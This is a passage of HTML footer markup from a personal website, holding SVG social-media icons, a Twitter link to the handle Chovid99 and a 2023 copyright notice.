40.3515,47.7256117 C41.2125,48.4695491 41.9805,49.9393525 41.9805,52.1877301 C41.9805,55.4089489 41.9505,58.0067059 41.9505,58.7973276 C41.9505,59.4418726 42.3825,60.1918338 43.6005,59.9554002 C53.13,56.7627944 60,47.7376593 60,37.096644 C60,23.7870921 49.254,13 35.9985,13" fill="#FFFFFF"></path>
            </g>
        </g>
    </g>
</svg>
    </a>

    <a class="symbol" href="https://twitter.com/Chovid99" rel="me" target="_blank">
        
        <svg fill="#bbbbbb" width="28" height="28" version="1.1" id="Capa_1" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" x="0px" y="0px"
	 width="438.536px" height="438.536px" viewBox="0 0 438.536 438.536" style="enable-background:new 0 0 438.536 438.536;"
	 xml:space="preserve">
<g>
	<path d="M414.41,24.123C398.333,8.042,378.963,0,356.315,0H82.228C59.58,0,40.21,8.042,24.126,24.123
		C8.045,40.207,0.003,59.576,0.003,82.225v274.084c0,22.647,8.042,42.018,24.123,58.102c16.084,16.084,35.454,24.126,58.102,24.126
		h274.084c22.648,0,42.018-8.042,58.095-24.126c16.084-16.084,24.126-35.454,24.126-58.102V82.225
		C438.532,59.576,430.49,40.204,414.41,24.123z M335.471,168.735c0.191,1.713,0.288,4.278,0.288,7.71
		c0,15.989-2.334,32.025-6.995,48.104c-4.661,16.087-11.8,31.504-21.416,46.254c-9.606,14.749-21.074,27.791-34.396,39.115
		c-13.325,11.32-29.311,20.365-47.968,27.117c-18.648,6.762-38.637,10.143-59.953,10.143c-33.116,0-63.76-8.952-91.931-26.836
		c4.568,0.568,9.329,0.855,14.275,0.855c27.6,0,52.439-8.565,74.519-25.7c-12.941-0.185-24.506-4.179-34.688-11.991
		c-10.185-7.803-17.273-17.699-21.271-29.691c4.947,0.76,8.658,1.137,11.132,1.137c4.187,0,9.042-0.76,14.56-2.279
		c-13.894-2.669-25.598-9.562-35.115-20.697c-9.519-11.136-14.277-23.84-14.277-38.114v-0.571
		c10.085,4.755,19.602,7.229,28.549,7.422c-17.321-11.613-25.981-28.265-25.981-49.963c0-10.66,2.758-20.747,8.278-30.264
		c15.035,18.464,33.311,33.213,54.816,44.252c21.507,11.038,44.54,17.227,69.092,18.558c-0.95-3.616-1.427-8.186-1.427-13.704
		c0-16.562,5.853-30.692,17.56-42.399c11.703-11.706,25.837-17.561,42.394-17.561c17.515,0,32.079,6.283,43.688,18.846
		c13.134-2.474,25.892-7.33,38.26-14.56c-4.757,14.652-13.613,25.788-26.55,33.402c12.368-1.716,23.88-4.95,34.537-9.708
		C357.458,149.793,347.462,160.166,335.471,168.735z"/>
</g>
</svg>

    </a>


</div>

    

    <div class="copyright">
    
       © Copyright 
       2023 
       <span class="split">
        <svg fill="#bbbbbb" width="15" height="15" version="1.1" id="heart-15" xmlns="http://www.w3.org/2000/svg" width="15px" height="15px" viewBox="0 0 15 15">
  <path d="M13.91,6.75c-1.17,2.25-4.3,5.31-6.07,6.94c-0.1903,0.1718-0.4797,0.1718-0.67,0C5.39,12.06,2.26,9,1.09,6.75&#xA;&#x9;C-1.48,1.8,5-1.5,7.5,3.45C10-1.5,16.48,1.8,13.91,6.75z"/>
</svg>
       </span>
       Chovid99
    
    </div>

    
</footer>



  </body>
</html>
